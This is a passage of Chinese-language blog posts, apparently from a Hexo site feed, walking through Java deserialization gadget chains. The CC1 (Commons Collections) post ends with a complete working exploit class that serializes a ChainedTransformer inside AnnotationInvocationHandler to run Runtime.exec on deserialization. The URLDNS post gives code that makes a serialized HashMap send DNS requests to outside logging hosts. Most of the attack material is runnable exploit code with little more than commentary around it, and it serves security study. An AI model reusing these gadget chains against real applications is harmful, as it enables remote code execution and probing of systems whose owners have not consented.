class="hljs-keyword">new</span> <span class="hljs-keyword">Class</span>[]&#123;String.<span class="hljs-keyword">class</span>&#125; ,<br>        <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><span class="hljs-keyword">Runtime</span> <span class="hljs-keyword">runtime</span> = <span class="hljs-keyword">Runtime</span>.getRuntime();<br><br>HashMap map = <span class="hljs-keyword">new</span> HashMap();<br> map.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);   <span class="hljs-comment">//注意后面方法的调用涉及到对map的遍历，所以此处map的值不能为空</span><br>Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-keyword">null</span>, invokerTransformer);<br><br>System.out.<span class="hljs-keyword">println</span>(transformedMap.entrySet().getClass());<br>System.out.<span class="hljs-keyword">println</span>(transformedMap.entrySet().iterator().getClass());<br>System.out.<span class="hljs-keyword">println</span>(transformedMap.entrySet().iterator().<span class="hljs-keyword">next</span>().getClass());<br>transformedMap.entrySet().iterator().<span class="hljs-keyword">next</span>().setValue(<span class="hljs-keyword">runtime</span>);<br></code></pre></td></tr></table></figure><p>也可以用循环解决</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">for</span> (Map.<span class="hljs-keyword">Entry</span>&lt;Object, Object&gt; <span class="hljs-keyword">entry</span> : <span class="hljs-type">transformedMap.entrySet</span>()) &#123;<br>    <span class="hljs-keyword">entry</span>.setValue(runtime);<br>&#125;<br></code></pre></td></tr></table></figure><p>即在调用tranformedmap的键值对的setValue()方法时，会触发tranformedMap的checksetvalue方法，进而实现rce(这个类也真是神奇</p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>继续向上查找谁调用了setValue方法</p><p>AnnotationInvocationHandler的readObject方法调用了setValue！！！</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dart"><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">Map</span>.Entry&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">Object</span>&gt; memberValue : memberValues.entrySet()) &#123;   <span class="hljs-comment">//有点熟悉</span><br>           <span class="hljs-built_in">String</span> name = memberValue.getKey();<br>           Class&lt;?&gt; memberType = memberTypes.<span class="hljs-keyword">get</span>(name);<br>           <span class="hljs-keyword">if</span> (memberType != <span class="hljs-keyword">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>               <span class="hljs-built_in">Object</span> value = memberValue.getValue();<br>               <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                     value instanceof ExceptionProxy)) &#123;<br>                   memberValue.setValue(                          <span class="hljs-comment">//就是这里</span><br>                       <span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(<br>                           value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                               annotationType.members().<span class="hljs-keyword">get</span>(name)));<br>               &#125;<br>           <br></code></pre></td></tr></table></figure><p>再去看看构造函数</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-title class_">AnnotationInvocationHandler</span>(<span class="hljs-title class_">Class</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; <span class="hljs-keyword">type</span>, <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; memberValues) &#123;<br>     <span class="hljs-title class_">Class</span>&lt;?&gt;[] superInterfaces = <span class="hljs-keyword">type</span>.<span class="hljs-title function_">getInterfaces</span>();<br>     <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">type</span>.<span class="hljs-title function_">isAnnotation</span>() ||<br>         superInterfaces.<span class="hljs-property">length</span> != <span class="hljs-number">1</span> ||<br>         superInterfaces[<span class="hljs-number">0</span>] != java.<span class="hljs-property">lang</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">Annotation</span>.<span class="hljs-property">class</span>)<br>         <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationFormatError</span>(<span class="hljs-string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);<br>     <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = <span class="hljs-keyword">type</span>;<br>     <span class="hljs-variable language_">this</span>.<span class="hljs-property">memberValues</span> = memberValues;<br> &#125;<br></code></pre></td></tr></table></figure><p>参数可控，直接让memberValues等于tranformedmap就好了</p><p>有一个问题AnnotationInvocationHandler类的构造方法是私有的，要通过反射才能序列化</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Class</span> clazz = <span class="hljs-keyword">Class</span>.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);<br>Constructor constructor = clazz.getDeclaredConstructor(<span class="hljs-keyword">Class</span>.<span class="hljs-keyword">class</span>, Map.<span class="hljs-keyword">class</span>);<br>constructor.setAccessible(<span class="hljs-keyword">true</span>);<br><span class="hljs-keyword">Object</span> obj = constructor.newInstance(Override.<span class="hljs-keyword">class</span>, transformedMap);<br></code></pre></td></tr></table></figure><p>至此链条基本完成。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h3><p>反序列化时</p><p>AnnotationInvocationHandler.readobject()    –&gt;    tranformedmap的entryset.setValue()    –&gt;   tranformedmap.checksetvalue()  –&gt; invokertranformer.tranform </p><p>从而实现任意类的任意方法调用</p><h2 id="一些调整"><a href="#一些调整" class="headerlink" title="一些调整:"></a>一些调整:</h2><p>1.进不去循环</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dart"><br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">Map</span>.Entry&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">Object</span>&gt; memberValue : memberValues.entrySet()) &#123;   <span class="hljs-comment">//有点熟悉</span><br>           <span class="hljs-built_in">String</span> name = memberValue.getKey();<br>           Class&lt;?&gt; memberType = memberTypes.<span class="hljs-keyword">get</span>(name);<br>           <span class="hljs-keyword">if</span> (memberType != <span class="hljs-keyword">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>               <span class="hljs-built_in">Object</span> value = memberValue.getValue();<br>               <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                     value instanceof ExceptionProxy)) &#123;<br>                   memberValue.setValue(                          <span class="hljs-comment">//就是这里</span><br>                       <span class="hljs-keyword">new</span> AnnotationTypeMismatchExceptionProxy(<br>                           value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                               annotationType.members().<span class="hljs-keyword">get</span>(name)));<br>               &#125;<br></code></pre></td></tr></table></figure><p>发现用上面的思路时弹不出来计算器的，跟进发现在memberType的判断这里挂了，因为@Override是没有的，所以我们换用@Target注解，里面有个value，同时map的键名也要改成value</p><p>2.runtime不能被序列化</p><p>runtime没有实现seri接口，所以无法被序列化。</p><p>提前做反射调用也不行，考虑在序列化的过程中实现反射调用，还记得invokertranformer可以实现任意类的任意方法调用，class类是可以序列化的，所以利用这个调用class在序列化的过程中反射获取runtime即可</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">        //Runtime不能被直接序列化，考虑使用反射调用<br><span class="hljs-keyword">Method</span> getRuntimeMethod=(<span class="hljs-keyword">Method</span>)<span class="hljs-built_in">new</span> InvokerTransformer(&quot;getMethod&quot;,<span class="hljs-built_in">new</span> <span class="hljs-keyword">Class</span>[]&#123;String.<span class="hljs-keyword">class</span>,<span class="hljs-keyword">Class</span>[].<span class="hljs-keyword">class</span>&#125;,<span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;&quot;getRuntime&quot;,<span class="hljs-keyword">null</span>&#125;).<span class="hljs-keyword">transform</span>(Runtime.<span class="hljs-keyword">class</span>);<br>Runtime r=(Runtime)<span class="hljs-built_in">new</span> InvokerTransformer(&quot;invoke&quot;,<span class="hljs-built_in">new</span> <span class="hljs-keyword">Class</span>[]&#123;<span class="hljs-keyword">Object</span>.<span class="hljs-keyword">class</span>, <span class="hljs-keyword">Object</span>[].<span class="hljs-keyword">class</span>&#125;,<span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;).<span class="hljs-keyword">transform</span>(getRuntimeMethod);<br><span class="hljs-built_in">new</span> InvokerTransformer(&quot;exec&quot;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Class</span>[]&#123;String.<span class="hljs-keyword">class</span>&#125;, <span class="hljs-built_in">new</span> <span class="hljs-keyword">Object</span>[]&#123;&quot;calc&quot;&#125;).<span class="hljs-keyword">transform</span>(r);<br></code></pre></td></tr></table></figure><p>如果是这样子就要调用三次，非常麻烦</p><p>想到chainedtransformer类可以链式调用，而且上一步的输出作为下一步的输入，非常适合</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs dart">Transformer[] transformers=<span class="hljs-keyword">new</span> Transformer[]&#123;<br>               <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.<span class="hljs-keyword">class</span>),   <span class="hljs-comment">//保证无论什么输入输出的都是runtime</span><br>               <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>,Class[].<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">Object</span>.<span class="hljs-keyword">class</span>, <span class="hljs-built_in">Object</span>[].<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>&#125;),<br>               <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>&#125;, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>       &#125;;<br>       ChainedTransformer  chainedTransformer  =<span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        chainedTransformer.transform(Runtime.<span class="hljs-keyword">class</span>);<br></code></pre></td></tr></table></figure><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp:"></a>完整exp:</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.transformer;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Transform</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oss</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;hacker.bin&quot;</span>));<br>        oss.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> Exception,ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Runtime不能被直接序列化，考虑使用反射调用</span><br>        <span class="hljs-comment">//Class a=Runtime.class;</span><br>        <span class="hljs-comment">//Method getRuntimeMethod=a.getMethod(&quot;getRuntime&quot;,null);</span><br>        <span class="hljs-comment">//Runtime r=(Runtime)getRuntimeMethod.invoke(null,null);</span><br>        <span class="hljs-comment">//Method execMethod=a.getMethod(&quot;exec&quot;, String.class);</span><br>        <span class="hljs-comment">//execMethod.invoke(r,&quot;calc&quot;);</span><br><br><span class="hljs-comment">//        Method getRuntimeMethod=(Method)new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">//        Runtime r=(Runtime)new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getRuntimeMethod);</span><br><span class="hljs-comment">//        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span>  <span class="hljs-variable">chainedTransformer</span>  <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><span class="hljs-comment">//        chainedTransformer.transform(Runtime.class);</span><br><span class="hljs-comment">//        Runtime runtime = Runtime.getRuntime();</span><br><span class="hljs-comment">//        InvokerTransformer invokerTransformer = new InvokerTransformer(</span><br><span class="hljs-comment">//                &quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;);</span><br>       <span class="hljs-comment">// invokerTransformer.transform(runtime);</span><br>        HashMap&lt;Object,Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate (map, <span class="hljs-literal">null</span>, chainedTransformer);<br>        <span class="hljs-comment">//for(Map.Entry entry:transformedMap.entrySet())</span><br>           <span class="hljs-comment">// entry.setValue(runtime);</span><br>        Class c=Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor annotationInvocationHandler=c.getDeclaredConstructor(Class.class,Map.class);<br>        annotationInvocationHandler.setAccessible(<span class="hljs-literal">true</span>);<br>     Object hacker=  annotationInvocationHandler.newInstance(Target.class,transformedMap);<br>        serialize(hacker);<br>        unserialize(<span class="hljs-string">&quot;hacker.bin&quot;</span>);<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>调整后的总结:</p><p>​                                                                                            注意此处注解和map的key要对上</p><p>AnnotationInvocationHandler.readobject()    –&gt;    tranformedmap的entryset.setValue()    –&gt;   tranformedmap.checksetvalue()  –&gt; chainedTransformer.tranform(可以是任意输入)  </p><p>调用了四次，在反序列化的过程中获取runtime</p><h2 id="关键跟进"><a href="#关键跟进" class="headerlink" title="关键跟进:"></a>关键跟进:</h2><p><img src="/../cc1/image-20251006180421129.png" alt="image-20251006180421129"></p><p>当注解和map的key对的上就会来到这一步</p><p><img src="/../cc1/image-20251006180537281.png" alt="image-20251006180537281"></p><p>发现输入的是一个奇怪的类，但是没有影响，因为我们第一步用的是ConstantTransformer</p><p><img src="/../cc1/image-20251006180710555.png" alt="image-20251006180710555"></p><p>获取runtime</p><p><img src="/../cc1/image-20251006180824586.png" alt="image-20251006180824586"></p><p>最后落脚到invoketranformer</p><p><a href="https://blog.csdn.net/qq_45305211/article/details/141720808?ops_request_misc=%7B%22request_id%22:%22985342fac63623ca55f13d540ef1d3c9%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=985342fac63623ca55f13d540ef1d3c9&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-141720808-null-null.142%5Ev102%5Epc_search_result_base1&utm_term=cc1%E5%88%A9%E7%94%A8%E9%93%BE&spm=1018.2226.3001.4187">Java反序列化利用链篇 | CC1链_全网最菜的分析思路【本系列文章的分析重点】-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>urldns</title>
    <link href="/2025/09/24/urldns/"/>
    <url>/2025/09/24/urldns/</url>
    
    <content type="html"><![CDATA[<h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p>HashMap重写了readObject函数，里面调用的putVal调用了hash函数</p><p><img src="/../dnsurl/1761322116122-52.png" alt="img"></p><p>Hash函数会调用键对象的hashcode方法</p><p><img src="/../dnsurl/1761322116121-46.png" alt="img"></p><p>从而可以利用传入url对象去触发url.hashcode方法，url.hashcode里面会触发urlstreamheader.hashcode,里面有个getHostAddress函数，会发出dns请求</p><p><img src="/../dnsurl/1761322116121-47.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.urldns;<br><br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.net.URLStreamHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException &#123;<br>        HashMap&lt;URL,Integer&gt; hashmap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>       URL url= <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://7n8m94.dnslog.cn&quot;</span>);<br>        hashmap.put(url,<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里还没开始触发反序列化就收到了dns请求</p><p><img src="/../dnsurl/1761322116121-48.png" alt="img"></p><p>发现url.hashcode的值为-1才会触发hashcode方法，而hashcode默认的初始值是-1</p><p><img src="/../dnsurl/1761322116121-49.png" alt="img"></p><p><img src="/../dnsurl/1761322116121-50.png" alt="img"></p><p>然后经过urlstreamheader.hashcode的一顿运算，导致hashcode不再等于-1，在反序列化的时候就无法触发了，所以现在考虑在put的时候让hashcode不为-1，put过后让其等于-1，利用反射机制来实现</p><p><img src="/../dnsurl/1761322116121-51.png" alt="img"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.fearless.test01;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        HashMap&lt;URL,Integer&gt; hashmap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        URL url=<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://aef4f49dce.ddns.1433.eu.org.&quot;</span>);<br>        Class c=url.getClass();<br>        Field hashcodefield=c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcodefield.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcodefield.set(url,<span class="hljs-number">123</span>);<br>         hashmap.put(url,<span class="hljs-number">1</span>); <span class="hljs-comment">//存入</span><br>         hashcodefield.set(url,-<span class="hljs-number">1</span>);<br>         serialize(hashmap);<br>    &#125;<br><br><br>&#125;<br><span class="hljs-keyword">package</span> com.fearless.test01;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInput;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">un</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassCastException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInput</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>最后反序列化成功</p><h2 